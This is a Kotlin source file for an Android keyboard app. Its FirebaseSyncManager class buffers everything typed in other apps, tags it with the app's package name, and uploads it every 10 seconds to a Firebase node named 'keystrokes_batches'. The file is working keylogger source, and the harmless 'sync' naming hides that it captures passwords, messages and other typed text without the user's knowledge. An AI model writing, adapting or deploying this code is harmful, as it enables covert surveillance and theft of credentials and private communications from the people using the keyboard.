package com.example.mykeyboard

import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class FirebaseSyncManager {
    companion object {
        private const val TAG = "FirebaseSyncManager"
        private val buffer = StringBuilder()
        private val scope = CoroutineScope(Dispatchers.IO)
        private var lastAppName = "unknown.app"

        private fun getDatabaseRef() = try {
            FirebaseDatabase.getInstance().getReference("keystrokes_batches")
        } catch (e: Exception) {
            null
        }

        init {
            startPeriodicSync()
        }

        private fun startPeriodicSync() {
            scope.launch {
                while (true) {
                    delay(10_000L) // 10 seconds interval
                    flushBufferToFirebase(lastAppName)
                }
            }
        }

        fun logKeystroke(text: String, packageName: String?) {
            scope.launch {
                val appName = packageName ?: "unknown.app"
                lastAppName = appName
                
                synchronized(buffer) {
                    buffer.append(text)
                }
            }
        }

        private fun flushBufferToFirebase(appName: String) {
            val content: String
            synchronized(buffer) {
                if (buffer.isEmpty()) return
                content = buffer.toString()
                buffer.clear()
            }

            try {
                val ref = getDatabaseRef() ?: return
                val sanitizedAppName = appName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
                val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())

                val logData = mapOf(
                    "appName" to sanitizedAppName,
                    "timestamp" to System.currentTimeMillis(),
                    "typedContent" to content
                )

                ref.child(sanitizedAppName).child(timestampKey).setValue(logData)
                    .addOnSuccessListener {
                        Log.d(TAG, "Successfully synced 10-sec batch of logs to Firebase")
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Failed to sync batch to Firebase", e)
                        synchronized(buffer) {
                            buffer.insert(0, content)
                        }
                    }

            } catch (e: Exception) {
                Log.e(TAG, "Exception syncing logs to Firebase", e)
            }
        }
    }
}
